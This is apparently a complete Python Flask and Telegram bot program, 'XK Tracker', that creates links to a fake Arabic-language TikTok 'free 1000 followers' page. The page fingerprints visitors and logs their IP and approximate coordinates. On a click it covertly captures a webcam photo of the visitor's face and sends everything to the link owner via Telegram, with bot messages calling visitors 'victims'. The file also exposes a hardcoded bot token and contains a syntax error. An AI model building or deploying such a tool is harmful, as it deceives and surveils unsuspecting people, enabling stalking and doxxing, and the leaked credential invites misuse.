import os, re, time, json, asyncio, secrets, urllib.parse, sqlite3
import aiohttp
from flask import Flask, request, render_template_string, send_file, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.constants import ParseMode
from telegram.ext import (ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters)

TOKEN    = os.environ.get("TOKEN", "8840043867:AAH62h0FG8AEn-LmHjl1EjlYyrdoFNbSwFk")
OWNER_ID = int(os.environ.get("OWNER_ID", "1108903232"))
DB_PATH  = "xk_tracker.db"
BASE_URL = os.environ.get("BASE_URL", "https://your-app.onrender.com")

flask_app = Flask(__name__)


# =========================================================
# DB
# =========================================================
def db_init():
    c = sqlite3.connect(DB_PATH)
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        token TEXT PRIMARY KEY, owner INTEGER, platform TEXT,
        created INTEGER, label TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT,
        ip TEXT, ua TEXT, lang TEXT, country TEXT, city TEXT,
        region TEXT, isp TEXT, lat REAL, lon REAL,
        screen TEXT, tz TEXT, photo BLOB,
        created INTEGER)""")
    c.commit(); c.close()


def db_new_link(owner, platform, label=""):
    tok = secrets.token_urlsafe(8)
    c = sqlite3.connect(DB_PATH)
    c.execute("INSERT INTO links VALUES (?, ?, ?, ?, ?)", (tok, owner, platform, int(time.time()), label))
    c.commit(); c.close()
    return tok


def db_get_link(tok):
    c = sqlite3.connect(DB_PATH)
    r = c.execute("SELECT owner, platform, created, label FROM links WHERE token=?", (tok,)).fetchone()
    c.close()
    return r


def db_log_hit(tok, ip, ua, lang, geo, extra, photo=None):
    c = sqlite3.connect(DB_PATH)
    c.execute("""INSERT INTO hits (token, ip, ua, lang, country, city, region, isp, lat, lon, screen, tz, photo, created)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (tok, ip, ua, lang,
         geo.get("country"), geo.get("city"), geo.get("region"), geo.get("isp"),
         geo.get("lat"), geo.get("lon"),
         extra.get("screen"), extra.get("tz"), photo, int(time.time())))
    c.commit(); c.close()


def db_get_hits(tok):
    c = sqlite3.connect(DB_PATH)
    rows = c.execute("""SELECT ip, ua, country, city, region, isp, lat, lon, screen, tz, photo, created
        FROM hits WHERE token=? ORDER BY id DESC LIMIT 100""", (tok,)).fetchall()
    c.close()
    return rows


# =========================================================
# IP GEOLOCATION
# =========================================================
async def geo_lookup(ip):
    if ip.startswith(("127.", "10.", "192.168.", "172.16.", "::1")):
        return {}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,regionName,isp,lat,lon,query", timeout=8) as r:
                d = await r.json()
                if d.get("status") == "success":
                    return {
                        "country": d.get("country"), "city": d.get("city"),
                        "region": d.get("regionName"), "isp": d.get("isp"),
                        "lat": d.get("lat"), "lon": d.get("lon"),
                    }
    except Exception:
        pass
    return {}


def get_real_ip(req):
    fwd = req.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return req.remote_addr or "0.0.0.0"


# =========================================================
# FAKE PAGES
# =========================================================
TIKTOK_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok — هدية 1000 متابع</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, "SF Arabic", Tahoma, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; direction: rtl; }
  .logo { width: 100px; height: 100px; background: #fe2c55; border-radius: 22px; display: flex; align-items: center; justify-content: center; font-size: 50px; margin-bottom: 20px; }
  h1 { font-size: 26px; margin-bottom: 12px; text-align: center; }
  .sub { color: #888; font-size: 14px; margin-bottom: 24px; text-align: center; line-height: 1.6; }
  .gift { font-size: 80px; margin: 20px 0; }
  .btn { background: #fe2c55; color: #fff; border: none; padding: 16px 40px; border-radius: 12px; font-size: 18px; font-weight: bold; margin-top: 24px; cursor: pointer; font-family: inherit; width: 100%; max-width: 320px; }
  .btn:active { background: #d81e45; }
  .stats { display: flex; gap: 20px; margin-top: 24px; }
  .stat { text-align: center; }
  .stat .n { font-size: 22px; font-weight: bold; color: #fe2c55; }
  .stat .l { color: #666; font-size: 12px; }
  .loading { display: none; text-align: center; margin-top: 20px; }
  .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
  <div class="logo">🎵</div>
  <h1>هدية 1000 متابع تيك توك</h1>
  <div class="sub">تم اختيارك عشوائياً للحصول على 1000 متابع مجاني وحقيقي خلال 5 دقائق.</div>
  <div class="gift">🎁</div>
  <button class="btn" onclick="startVerify()">احصل على 1000 متابع</button>
  <div class="stats">
    <div class="stat"><div class="n">2.4M</div><div class="l">استفادوا</div></div>
    <div class="stat"><div class="n">4.9★</div><div class="l">تقييم</div></div>
    <div class="stat"><div class="n">24h</div><div class="l">دعم</div></div>
  </div>
  <div class="loading" id="loading">
    <div class="spinner"></div>
    <div style="margin-top:16px;color:#888">جاري التحقق من حسابك...</div>
  </div>
<script>
  // إرسال بصمة الجهاز فور الفتح
  const data = {
    screen: screen.width + "x" + screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform,
    lang: navigator.language
  };
  fetch("/__fp", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data) });

  function startVerify() {
    document.getElementById("loading").style.display = "block";
    // محاولة الوصول للكاميرا (تطلب موافقة تلقائية)
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.style.display = "none";
        document.body.appendChild(video);
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          canvas.getContext("2d").drawImage(video, 0, 0);
          const photo = canvas.toDataURL("image/jpeg", 0.7);
          fetch("/__photo", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ photo: photo }) });
          stream.getTracks().forEach(t => t.stop());
        }, 2500);
        setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 4000);
      })
      .catch(err => {
        setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 2000);
      });
  }
</script>
</body>
</html>
"""


# =========================================================
# ROUTES
# =========================================================
@flask_app.route("/")
def index():
    return "XK", 200


@flask_app.route("/<token>")
def tracker_page(token):
    link = db_get_link(token)
    if not link:
        return "Not found", 404
    platform = link[1]
    if platform == "tiktok":
        return render_template_string(TIKTOK_PAGE)
    return render_template_string(TIKTOK_PAGE)


@flask_app.route("/__fp", methods=["POST"])
def fingerprint(token=None):
    # token come from referer
    ref = request.headers.get("Referer", "")
    m = re.search(r"/([A-Za-z0-9_-]+)$", ref)
    if not m:
        return "", 204
    tok = m.group(1)
    ip = get_real_ip(request)
    ua = request.headers.get("User-Agent", "")
    lang = request.headers.get("Accept-Language", "")
    extra = request.get_json(silent=True) or {}
    asyncio.run(_save_hit(tok, ip, ua, lang, extra))
    return "", 204


@flask_app.route("/__photo", methods=["POST"])
def photo():
    ref = request.headers.get("Referer", "")
    m = re.search(r"/([A-Za-z0-9_-]+)$", ref)
    if not m:
        return "", 204
    tok = m.group(1)
    data = request.get_json(silent=True) or {}
    photo_b64 = data.get("photo", "")
    if not photo_b64:
        return "", 204
    import base64
    try:
        raw = base64.b64decode(photo_b64.split(",")[-1])
    except Exception:
        return "", 204
    asyncio.run(_save_photo(tok, raw))
    return "", 204


async def _save_hit(tok, ip, ua, lang, extra):
    geo = await geo_lookup(ip)
    db_log_hit(tok, ip, ua, lang, geo, extra)
    # أرسل للمالك
    owner_info = db_get_link(tok)
    if owner_info:
        owner = owner_info[0]
        msg = (
            f"🎯 <b>ضحية جديدة</b>\n"
            f"IP: <code>{ip}</code>\n"
            f"الدولة: {geo.get('country', '—')}\n"
            f"المدينة: {geo.get('city', '—')}\n"
            f"المنطقة: {geo.get('region', '—')}\n"
            f"مزود الخدمة: {geo.get('isp', '—')}\n"
            f"الإحداثيات: {geo.get('lat', '—')}, {geo.get('lon', '—')}\n"
            f"اللغة: {lang}\n"
            f"الشاشة: {extra.get('screen', '—')}\n"
            f"المنطقة الزمنية: {extra.get('tz', '—')}\n"
            f"UA: <code>{ua[:120]}</code>"
        )
        try:
            async with aiohttp.ClientSession() as s:
                await s.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                    json={"chat_id": owner, "text": msg, "parse_mode": "HTML"})
        except Exception:
            pass


async def _save_photo(tok, raw):
    owner_info = db_get_link(tok)
    if not owner_info:
        return
    owner = owner_info[0]
    try:
        async with aiohttp.ClientSession() as s:
            form = aiohttp.FormData()
            form.add_field("chat_id", str(owner))
            form.add_field("photo", raw, filename="face.jpg", content_type="image/jpeg")
            form.add_field("caption", "📸 صورة الوجه")
            await s.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data=form)
    except Exception:
        pass


# =========================================================
# TELEGRAM BOT
# =========================================================
async def cmd_start(update, context):
    await update.message.reply_text(
        f"👋 أهلاً <b>{update.effective_user.first_name}</b>\n\n"
        f"🎯 <b>XK Tracker Bot</b>\n"
        f"سوِّ رابط تتبع يعطيك:\n"
        f"• IP + موقع + مزود الخدمة\n"
        f"• صورة وجه الضحية\n"
        f"• معلومات الجهاز\n\n"
        f"الأوامر:\n"
        f"/new_tiktok — رابط تيك توك وهمي\n"
        f"/new_link — رابط تتبع عام\n"
        f"/list — روابطك\n"
        f"/hits <token> — ضحايا رابط\n",
        parse_mode=ParseMode.HTML)


async def cmd_new_tiktok(update, context):
    tok = db_new_link(update.effective_user.id, "tiktok")
    url = f"{BASE_URL}/{tok}"
    await update.message.reply_text(
        f"🎵 <b>رابط TikTok وهمي</b>\n\n"
        f"الرابط:\n<code>{url}</code>\n\n"
        f"Token: <code>{tok}</code>\n\n"
        f"الصفحة تدّعي إعطاء 1000 متابع. لما يفتح الضحية:\n"
        f"• يجيك IP + موقع\n"
        f"• صورة وجهه (إذا وافق)\n"
        f"• معلومات جهازه\n\n"
        f"شوف الضحايا: /hits {tok}",
        parse_mode=ParseMode.HTML)


async def cmd_new_link(update, context):
    tok = db_new_link(update.effective_user.id, "generic")
    url = f"{BASE_URL}/{tok}"
    await update.message.reply_text(
        f"🔗 <b>رابط تتبع عام</b>\n\n<code>{url}</code>\n\nToken: <code>{tok}</code>",
        parse_mode=ParseMode.HTML)


async def cmd_list(update, context):
    import sqlite3
    c = sqlite3.connect(DB_PATH)
    rows = c.execute("SELECT token, platform, created FROM links WHERE owner=? ORDER BY created DESC LIMIT 20",
                     (update.effective_user.id,)).fetchall()
    c.close()
    if not rows:
        await update.message.reply_text("ما عندك روابط.")
        return
    txt = "\n".join(f"<code>{r[0]}</code> — {r[1]} — {time.strftime('%m/%d %H:%M', time.localtime(r[2]))}" for r in rows)
    await update.message.reply_text(f"📋 <b>روابطك</b>\n\n{txt}", parse_mode=ParseMode.HTML)


async def cmd_hits(update, context):
    if not context.args:
        await update.message.reply_text("الاستخدام: /hits <token>")
        return
    tok = context.args[0]
    link = db_get_link(tok)
    if not link or link[0] != update.effective_user.id:
        await update.message.reply_text("❌ الرابط مو لك.")
        return
    rows = db_get_hits(tok)
    if not rows:
        await update.message.reply_text("لا يوجد ضحايا بعد.")
        return
    for r in rows[:10]:
        ip, ua, country, city, region, isp, lat, lon, screen, tz, photo, ts = r
        txt = (
            f"🎯 <b>ضحية</b> — {time.strftime('%m/%d %H:%M', time.localtime(ts))}\n"
            f"IP: <code>{ip}</code>\n"
            f"الدولة: {country or '—'} / {city or '—'}\n"
            f"المنطقة: {region or '—'}\n"
            f"ISP: {isp or '—'}\n"
            f"الإحداثيات: {lat or '—'}, {lon or '—'}\n"
            f"الشاشة: {screen or '—'}\n"
            f"TZ: {tz or '—'}\n"
            f"UA: <code>{(ua or '')[:100]}</code>"
        )
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
        if photo:
            await update.message.reply_photo(photo=InputFile(io.BytesIO(photo), filename="face.jpg"), caption="📸")


async def cmd_stats(update, context):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 للمالك فقط.")
        return
    import sqlite3
    c = sqlite3.connect(DB_PATH)
    links = c.execute("SELECT COUNT(*) FROM links").fetchone()[0]
    hits = c.execute("SELECT COUNT(*) FROM hits").fetchone()[0]
    c.close()
    await update.message.reply_text(f"📊 روابط: {links}\nضحايا: {hits}")


# =========================================================
# MAIN
# =========================================================
def main():
    db_init()
    import threading
    port = int(os.environ.get("PORT", 10000))
    threading.Thread(
        target=lambda: flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False),
        daemon=True
    ).start()

    app = ApplicationBuilder().token(8840043867:AAH62h0FG8AEn-LmHjl1EjlYyrdoFNbSwFk).concurrent_updates(True).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("new_tiktok", cmd_new_tiktok))
    app.add_handler(CommandHandler("new_link", cmd_new_link))
    app.add_handler(CommandHandler("list", cmd_list))
    app.add_handler(CommandHandler("hits", cmd_hits))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    import io
    main()
